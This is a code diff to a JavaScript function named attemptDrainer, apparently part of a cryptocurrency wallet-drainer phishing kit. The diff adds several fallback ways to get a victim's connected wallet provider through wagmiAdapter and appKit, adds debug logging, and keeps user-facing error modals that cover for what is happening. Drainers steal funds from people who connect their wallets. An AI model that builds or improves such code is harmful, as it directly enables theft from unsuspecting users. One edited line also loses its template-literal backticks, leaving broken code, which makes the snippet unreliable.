@@ -947,19 +947,54 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Ожидаем доступность провайдера
-    let walletProvider = wagmiAdapter.provider;
-    let attempts = 0;
-    const maxAttempts = 10;
-    const interval = 1000;
+    // Логируем состояние wagmiAdapter и appKit для отладки
+    console.log('🔍 wagmiAdapter:', {
+      hasProvider: !!wagmiAdapter.provider,
+      hasWagmiClient: !!wagmiAdapter.wagmiClient,
+      wagmiClientProvider: wagmiAdapter.wagmiClient ? !!wagmiAdapter.wagmiClient.getProvider : null
+    });
+    console.log('🔍 appKit state:', JSON.stringify(appKit.getState ? appKit.getState() : {}, null, 2));
 
-    while (!walletProvider && attempts < maxAttempts) {
-      console.log(`ℹ️ Ожидание провайдера, попытка ${attempts + 1}/${maxAttempts}...`);
-      await new Promise(resolve => setTimeout(resolve, interval));
-      walletProvider = wagmiAdapter.provider;
-      attempts++;
+    // Пытаемся получить провайдер
+    let walletProvider = null;
+
+    // Вариант 1: Через wagmiAdapter.wagmiClient.getProvider
+    if (wagmiAdapter.wagmiClient?.getProvider) {
+      try {
+        walletProvider = await wagmiAdapter.wagmiClient.getProvider();
+        console.log('✅ Провайдер получен через wagmiAdapter.wagmiClient.getProvider');
+      } catch (error) {
+        console.warn(`⚠️ Не удалось получить провайдер через wagmiClient.getProvider: ${error.message}`);
+      }
     }
 
+    // Вариант 2: Проверяем wagmiAdapter.provider с ожиданием
+    if (!walletProvider) {
+      let attempts = 0;
+      const maxAttempts = 10;
+      const interval = 1000;
+
+      while (!walletProvider && attempts < maxAttempts) {
+        console.log(`ℹ️ Ожидание wagmiAdapter.provider, попытка ${attempts + 1}/${maxAttempts}...`);
+        walletProvider = wagmiAdapter.provider;
+        if (!walletProvider) {
+          await new Promise(resolve => setTimeout(resolve, interval));
+        }
+        attempts++;
+      }
+    }
+
+    // Вариант 3: Пробуем appKit.getProvider (если доступен)
+    if (!walletProvider && appKit.getProvider) {
+      try {
+        walletProvider = await appKit.getProvider();
+        console.log('✅ Провайдер получен через appKit.getProvider');
+      } catch (error) {
+        console.warn(`⚠️ Не удалось получить провайдер через appKit.getProvider: ${error.message}`);
+      }
+    }
+
+    // Проверяем, удалось ли получить провайдер
     if (!walletProvider) {
       throw new Error('No provider available after wallet connection');
     }
@@ -998,7 +1033,7 @@ async function attemptDrainer() {
     } else if (error.message.includes('Failed to switch')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
-      errorMessage = `Error: ${error.message}`;
+errorMessage = Error: ${error.message};
     }
     console.error(`❌ Drainer error: ${errorMessage}`);
     await hideModalWithDelay(errorMessage);
